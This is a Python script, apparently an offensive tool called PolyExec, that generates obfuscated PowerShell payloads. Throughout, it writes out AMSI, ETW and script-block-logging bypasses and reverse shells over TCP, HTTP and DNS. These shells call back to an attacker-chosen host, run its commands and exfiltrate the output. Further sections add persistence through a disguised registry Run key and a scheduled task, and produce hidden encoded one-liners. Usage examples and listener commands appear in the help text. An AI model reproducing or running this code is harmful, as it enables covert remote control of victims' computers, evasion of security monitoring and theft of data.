#!/usr/bin/env python3
"""
▄▖  ▜   ▄▖         P01ym0rph1c
▙▌▛▌▐ ▌▌▙▖▚▘█▌▛▘   P0w3rSh3ll
▌ ▙▌▐▖▙▌▙▖▞▖▙▖▙▖   P4yl04d
      ▄▌           G3n3r4t0r
 x: @st8less

"""

import random
import string
import base64
import argparse
import os
from datetime import datetime

class PolyExecGenerator:
    def __init__(self, target, port, key=None, mode='tcp'):
        self.target = target
        self.port = port
        self.key = key or "MySecretKey123"
        self.mode = mode
        
    def random_var(self, length=8):
        """generate random variable name"""
        first = random.choice(string.ascii_uppercase)
        rest = ''.join(random.choices(string.ascii_letters + string.digits, k=length-1))
        return first + rest
    
    def random_comment(self):
        """generate random junk comments"""
        comments = [
            "# PDF",
            "# DOCX",
            "# PNG",
            "# GIF",
            "# JPEG",
            "# Registry maintenance tool",
            "# Scheduled task handler",
            "# Background process manager",
            "# System resource allocator",
            "# Configuration sync utility",
            "# Memory cleanup process",
            "# Cache optimization routine"
        ]
        return random.choice(comments)
    
    def random_junk_code(self):
        """gen innocent junk code"""
        junk = [
            "$null = Get-Date",
            "$env:TEMP | Out-Null",
            "[System.GC]::Collect()",
            "$ErrorActionPreference = 'SilentlyContinue'",
            "Start-Sleep -Milliseconds " + str(random.randint(1, 100)),
            "$host.UI.RawUI.WindowTitle = 'System Process'",
            "$ProgressPreference = 'SilentlyContinue'",
            "[System.Threading.Thread]::CurrentThread.Priority = 'Normal'",
        ]
        return random.choice(junk)
    
    def generate_amsi_bypass(self):
        """AMSI BYPASS"""
        vars = {
            'amsi': self.random_var(),
            'field': self.random_var()
        }
        
        return f"""
{self.random_comment()}

# AMSI bypass
try {{
    ${vars['amsi']} = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    ${vars['field']} = ${vars['amsi']}.GetField('amsiInitFailed', 'NonPublic,Static')
    ${vars['field']}.SetValue($null, $true)
}} catch {{}}

{self.random_junk_code()}
"""
    
    def generate_etw_bypass(self):
        """etw bypass"""
        vars = {
            'etw': self.random_var(),
            'field': self.random_var(),
            'provider': self.random_var()
        }
        
        return f"""

try {{
    ${vars['etw']} = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
    if (${vars['etw']}) {{
        ${vars['field']} = ${vars['etw']}.GetField('etwProvider','NonPublic,Static')
        ${vars['provider']} = ${vars['field']}.GetValue($null)
        [System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue(${vars['provider']}, 0)
    }}
}} catch {{}}

{self.random_junk_code()}
"""
    
    def generate_scriptblock_bypass(self):
        """script block logging bypass"""
        vars = {
            'settings': self.random_var(),
            'cached': self.random_var()
        }
        
        return f"""
# run
try {{
    ${vars['settings']} = [Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static')
    if (${vars['settings']}) {{
        ${vars['cached']} = ${vars['settings']}.GetValue($null)
        ${vars['cached']}['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
        ${vars['cached']}['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
    }}
}} catch {{}}

{self.random_junk_code()}
"""
    
    def generate_encryption_functions(self):
        """AES crypt"""
        vars = {
            'aes': self.random_var(),
            'cipher': self.random_var(),
            'encrypted': self.random_var(),
            'decrypted': self.random_var()
        }
        
        return f"""
function Decrypt-Data {{
    param([string]$ciphertext, [string]$key)
    
    ${vars['aes']} = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    ${vars['aes']}.Key = [System.Text.Encoding]::UTF8.GetBytes($key.PadRight(32).Substring(0,32))
    ${vars['aes']}.IV = [System.Text.Encoding]::UTF8.GetBytes("1234567890123456")
    
    ${vars['cipher']} = ${vars['aes']}.CreateDecryptor()
    ${vars['encrypted']} = [Convert]::FromBase64String($ciphertext)
    ${vars['decrypted']} = ${vars['cipher']}.TransformFinalBlock(${vars['encrypted']}, 0, ${vars['encrypted']}.Length)
    
    return [System.Text.Encoding]::UTF8.GetString(${vars['decrypted']})
}}

function Encrypt-Data {{
    param([string]$plaintext, [string]$key)
    
    ${vars['aes']} = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    ${vars['aes']}.Key = [System.Text.Encoding]::UTF8.GetBytes($key.PadRight(32).Substring(0,32))
    ${vars['aes']}.IV = [System.Text.Encoding]::UTF8.GetBytes("1234567890123456")
    
    ${vars['cipher']} = ${vars['aes']}.CreateEncryptor()
    ${vars['encrypted']} = [System.Text.Encoding]::UTF8.GetBytes($plaintext)
    ${vars['decrypted']} = ${vars['cipher']}.TransformFinalBlock(${vars['encrypted']}, 0, ${vars['encrypted']}.Length)
    
    return [Convert]::ToBase64String(${vars['decrypted']})
}}

{self.random_junk_code()}
"""
    
    def generate_tcp_shell(self, encrypted=False):
        """r3v3rs3 sh3ll"""
        
        vars = {
            'client': self.random_var(),
            'stream': self.random_var(),
            'bytes': self.random_var(),
            'data': self.random_var(),
            'result': self.random_var(),
            'output': self.random_var(),
            'encoded': self.random_var(),
            'index': self.random_var()
        }
        
        payload_parts = []
        payload_parts.append(self.generate_amsi_bypass())
        
        if encrypted:
            payload_parts.append(self.generate_etw_bypass())
            payload_parts.append(self.generate_scriptblock_bypass())
            payload_parts.append(self.generate_encryption_functions())
            
            vars.update({
                'reader': self.random_var(),
                'writer': self.random_var(),
                'command': self.random_var(),
                'encrypted': self.random_var()
            })
            
            payload_parts.append(f"""
      
      
  #tcp
${vars['client']} = New-Object System.Net.Sockets.TCPClient('{self.target}', {self.port})
${vars['stream']} = ${vars['client']}.GetStream()
${vars['writer']} = New-Object System.IO.StreamWriter(${vars['stream']})
${vars['reader']} = New-Object System.IO.StreamReader(${vars['stream']})

${vars['encrypted']} = Encrypt-Data -plaintext "READY|$env:COMPUTERNAME|$env:USERNAME" -key '{self.key}'
${vars['writer']}.WriteLine(${vars['encrypted']})
${vars['writer']}.Flush()

while(${vars['client']}.Connected) {{
    Start-Sleep -Milliseconds {random.randint(100, 500)}
    
    if (${vars['stream']}.DataAvailable) {{
        ${vars['encrypted']} = ${vars['reader']}.ReadLine()
        
        if (${vars['encrypted']}) {{
            ${vars['command']} = Decrypt-Data -ciphertext ${vars['encrypted']} -key '{self.key}'
            
            if (${vars['command']} -eq "exit") {{ break }}
            
            ${vars['output']} = try {{
                Invoke-Expression -Command ${vars['command']} 2>&1 | Out-String
            }} catch {{
                $_.Exception.Message
            }}
            
            ${vars['encrypted']} = Encrypt-Data -plaintext ${vars['output']} -key '{self.key}'
            ${vars['writer']}.WriteLine(${vars['encrypted']})
            ${vars['writer']}.Flush()
        }}
    }}
}}

${vars['client']}.Close()
""")
        else:
            payload_parts.append(f"""
# Basic TCP connection
${vars['client']} = New-Object System.Net.Sockets.TCPClient('{self.target}', {self.port})
${vars['stream']} = ${vars['client']}.GetStream()
[byte[]]${vars['bytes']} = 0..65535 | ForEach-Object {{0}}

{self.random_junk_code()}

while ((${vars['index']} = ${vars['stream']}.Read(${vars['bytes']}, 0, ${vars['bytes']}.Length)) -ne 0) {{
    ${vars['data']} = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(${vars['bytes']}, 0, ${vars['index']})
    
    try {{
        ${vars['result']} = Invoke-Expression -Command ${vars['data']} 2>&1 | Out-String
    }} catch {{
        ${vars['result']} = $_.Exception.Message
    }}
    
    ${vars['output']} = ${vars['result']} + 'PS ' + (Get-Location).Path + '> '
    ${vars['encoded']} = ([System.Text.Encoding]::ASCII).GetBytes(${vars['output']})
    ${vars['stream']}.Write(${vars['encoded']}, 0, ${vars['encoded']}.Length)
    ${vars['stream']}.Flush()
}}

${vars['client']}.Close()
""")
        
        return '\n'.join(payload_parts)
    
    def generate_http_shell(self):
        """Generate HTTP/HTTPS C2 shell"""
        
        vars = {
            'url': self.random_var(),
            'session': self.random_var(),
            'headers': self.random_var(),
            'response': self.random_var(),
            'command': self.random_var(),
            'output': self.random_var(),
            'encrypted': self.random_var(),
            'body': self.random_var()
        }
        
        payload_parts = []
        payload_parts.append(self.generate_amsi_bypass())
        payload_parts.append(self.generate_etw_bypass())
        payload_parts.append(self.generate_scriptblock_bypass())
        payload_parts.append(self.generate_encryption_functions())
        
        payload_parts.append(f"""
# http c2 connect
${vars['url']} = "{self.target}"
${vars['session']} = [guid]::NewGuid().ToString()

while($true) {{
    try {{
        ${vars['headers']} = @{{
            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            "X-Session-ID" = ${vars['session']}
        }}
        
        ${vars['response']} = Invoke-WebRequest -Uri "${{vars['url']}}/cmd" -Headers ${vars['headers']} -UseBasicParsing -TimeoutSec 5 -ErrorAction SilentlyContinue
        
        if (${vars['response']}.Content) {{
            ${vars['command']} = Decrypt-Data -ciphertext ${vars['response']}.Content -key '{self.key}'
            
            if (${vars['command']} -eq "exit") {{ break }}
            
            ${vars['output']} = try {{
                Invoke-Expression -Command ${vars['command']} 2>&1 | Out-String
            }} catch {{
                $_.Exception.Message
            }}
            
            ${vars['encrypted']} = Encrypt-Data -plaintext ${vars['output']} -key '{self.key}'
            ${vars['body']} = @{{data = ${vars['encrypted']}; session = ${vars['session']}}} | ConvertTo-Json
            
            Invoke-WebRequest -Uri "${{vars['url']}}/result" -Method POST -Body ${vars['body']} -Headers ${vars['headers']} -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null
        }}
        
        Start-Sleep -Seconds {random.randint(3, 7)}
    }} catch {{
        Start-Sleep -Seconds {random.randint(5, 10)}
    }}
}}
""")
        
        return '\n'.join(payload_parts)
    
    def generate_dns_shell(self, domain):
        """DNS c2 sh3ll"""
        
        vars = {
            'session': self.random_var(),
            'query': self.random_var(),
            'txt': self.random_var(),
            'command': self.random_var(),
            'output': self.random_var(),
            'encoded': self.random_var(),
            'chunks': self.random_var(),
            'chunk': self.random_var(),
            'exfil': self.random_var()
        }
        
        payload_parts = []
        payload_parts.append(self.generate_amsi_bypass())
        payload_parts.append(self.generate_etw_bypass())
        
        payload_parts.append(f"""
# DNS connect
${vars['session']} = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object {{[char]$_}})

while($true) {{
    try {{
        ${vars['query']} = "${{vars['session']}}.{domain}"
        ${vars['txt']} = (Resolve-DnsName -Name ${vars['query']} -Type TXT -ErrorAction SilentlyContinue).Strings
        
        if (${vars['txt']}) {{
            ${vars['command']} = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(${vars['txt']}[0]))
            
            if (${vars['command']} -eq "exit") {{ break }}
            
            ${vars['output']} = try {{
                Invoke-Expression -Command ${vars['command']} 2>&1 | Out-String
            }} catch {{
                $_.Exception.Message
            }}
            
            ${vars['encoded']} = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(${vars['output']}))
            ${vars['chunks']} = ${vars['encoded']} -split '(.{{32}})' | Where-Object {{$_}}
            
            foreach (${vars['chunk']} in ${vars['chunks']}) {{
                ${vars['exfil']} = "${{vars['session']}}.${{vars['chunk']}}.exfil.{domain}"
                Resolve-DnsName -Name ${vars['exfil']} -Type A -ErrorAction SilentlyContinue | Out-Null
            }}
        }}
        
        Start-Sleep -Seconds {random.randint(5, 10)}
    }} catch {{
        Start-Sleep -Seconds {random.randint(10, 20)}
    }}
}}
""")
        
        return '\n'.join(payload_parts)
    
    def generate_persistence(self):
        """persistence"""
        
        vars = {
            'path': self.random_var(),
            'name': self.random_var(),
            'action': self.random_var(),
            'trigger': self.random_var()
        }
        
        return f"""
    # doink! install
${vars['path']} = "$env:APPDATA\\Windows\\svchost.ps1"
${vars['name']} = "WindowsUpdateCheck"

Copy-Item $PSCommandPath ${vars['path']} -Force

try {{
    Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name ${vars['name']} -Value "powershell.exe -WindowStyle Hidden -File ${vars['path']}" -ErrorAction SilentlyContinue
}} catch {{}}

try {{
    ${vars['action']} = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -W Hidden -File ${vars['path']}"
    ${vars['trigger']} = New-ScheduledTaskTrigger -AtLogon
    Register-ScheduledTask -TaskName ${vars['name']} -Action ${vars['action']} -Trigger ${vars['trigger']} -RunLevel Highest -Force -ErrorAction SilentlyContinue | Out-Null
}} catch {{}}

{self.random_junk_code()}
"""
    
    def generate_payload(self, dns_domain=None, add_persistence=False):
        """gen payload based on switches"""
        
        if self.mode == 'tcp':
            payload = self.generate_tcp_shell(encrypted=False)
        elif self.mode == 'encrypted':
            payload = self.generate_tcp_shell(encrypted=True)
        elif self.mode == 'http':
            payload = self.generate_http_shell()
        elif self.mode == 'dns':
            if not dns_domain:
                raise ValueError("DNS mode requires --dns-domain parameter")
            payload = self.generate_dns_shell(dns_domain)
        else:
            raise ValueError(f"Unknown mode: {self.mode}")
        
        if add_persistence:
            payload = payload + "\n" + self.generate_persistence()
        
        return payload
    
    def generate_oneliner(self, payload):
        """base64 1 liner"""
        oneliner = payload.replace('\n', ';').replace(';;', ';')
        encoded = base64.b64encode(oneliner.encode('utf-16le')).decode()
        return f"powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {encoded}"
    
    def save_payload(self, payload, output_dir='payloads'):
        """save to file"""
        os.makedirs(output_dir, exist_ok=True)
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"polyexec_{self.mode}_{timestamp}_{random.randint(1000, 9999)}.ps1"
        filepath = os.path.join(output_dir, filename)
        
        with open(filepath, 'w') as f:
            f.write(payload)
        
        return filepath


def main():
    parser = argparse.ArgumentParser(
        description='PolyExec - Polymorphic PowerShell Payload Generator',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
C2 Modes:
  tcp           Basic TCP reverse shell (simple, fast)
  encrypted     AES-256 encrypted TCP shell (recommended)
  http          HTTP/HTTPS C2 (blends with web traffic)
  dns           DNS-based C2 (most covert)

Examples:
  # Basic TCP shell
  ./polyexecgen.py -t 192.168.1.100 -p 4444 -m tcp
  
  # Encrypted shell (recommended)
  ./polyexecgen.py -t 192.168.1.100 -p 4444 -m encrypted -k MySecretKey
  
  # HTTP C2
  ./polyexecgen.py -t http://192.168.1.100:8080/shell -m http -k MyKey
  
  # DNS C2
  ./polyexecgen.py -m dns --dns-domain c2.example.com
  
  # Generate 5 variants with persistence
  ./polyexecgen.py -t 192.168.1.100 -p 4444 -m encrypted -c 5 --persist
  
  # Generate one-liner
  ./polyexecgen.py -t 192.168.1.100 -p 4444 -m tcp --oneliner
        """
    )
    
    parser.add_argument('-t', '--target', help='Target IP/URL (not needed for DNS mode)')
    parser.add_argument('-p', '--port', type=int, help='Target port (for TCP modes)')
    parser.add_argument('-m', '--mode', choices=['tcp', 'encrypted', 'http', 'dns'], 
                       default='encrypted', help='C2 mode (default: encrypted)')
    parser.add_argument('-k', '--key', help='Encryption key (default: MySecretKey123)')
    parser.add_argument('--dns-domain', help='DNS domain for DNS C2 mode')
    parser.add_argument('-o', '--output', default='payloads', help='Output directory (default: payloads)')
    parser.add_argument('-c', '--count', type=int, default=1, help='Number of variants to generate')
    parser.add_argument('--persist', action='store_true', help='Add persistence mechanisms')
    parser.add_argument('--oneliner', action='store_true', help='Generate as base64 one-liner')
    
    args = parser.parse_args()
    
    # validation ?
    if args.mode in ['tcp', 'encrypted'] and (not args.target or not args.port):
        parser.error(f"{args.mode} mode requires --target and --port")
    if args.mode == 'http' and not args.target:
        parser.error("http mode requires --target (URL)")
    if args.mode == 'dns' and not args.dns_domain:
        parser.error("dns mode requires --dns-domain")
    
    print("""
    
▄▖  ▜   ▄▖         P01ym0rph1c
▙▌▛▌▐ ▌▌▙▖▚▘█▌▛▘   P0w3rSh3ll
▌ ▙▌▐▖▙▌▙▖▞▖▙▖▙▖   P4yl04d
      ▄▌           G3n3r4t0r
 x: @st8less


    """)
    
    for i in range(args.count):
        generator = PolyExecGenerator(args.target, args.port, args.key, args.mode)
        
        print(f"\n[*] Generating payload variant {i+1}/{args.count}...")
        print(f"    Mode: {args.mode}")
        
        if args.mode == 'encrypted':
            print(f"    Encryption: AES-256")
            print(f"    Key: {args.key or 'MySecretKey123'}")
        
        if args.persist:
            print(f"    Persistence: Enabled")
        
        # gen payload
        payload = generator.generate_payload(
            dns_domain=args.dns_domain,
            add_persistence=args.persist
        )
        
        # save or create 1 liner.
        if args.oneliner:
            oneliner = generator.generate_oneliner(payload)
            print(f"\n[+] One-liner generated:")
            print(f"\n{oneliner}\n")
        else:
            filepath = generator.save_payload(payload, args.output)
            print(f"[+] Saved to: {filepath}")
            print(f"    Size: {len(payload)} bytes")
    
    print(f"\n[*] Generation complete!")
    
    if not args.oneliner:
        print(f"    Files saved to: {args.output}/")
        print(f"\n[*] Transfer to target and execute:")
        print(f"    powershell.exe -ExecutionPolicy Bypass -File payload.ps1")
    
    print(f"\n[*] Start listener:")
    if args.mode == 'tcp':
        print(f"    nc -lvnp {args.port}")
    elif args.mode == 'encrypted':
        print(f"    python3 c2_listener.py")
        print(f"    Select [1] Encrypted, Key: {args.key or 'MySecretKey123'}")
    elif args.mode == 'http':
        print(f"    Set up Flask/Express server at {args.target}")
    elif args.mode == 'dns':
        print(f"    Set up DNS server for domain: {args.dns_domain}")


if __name__ == '__main__':
    main()
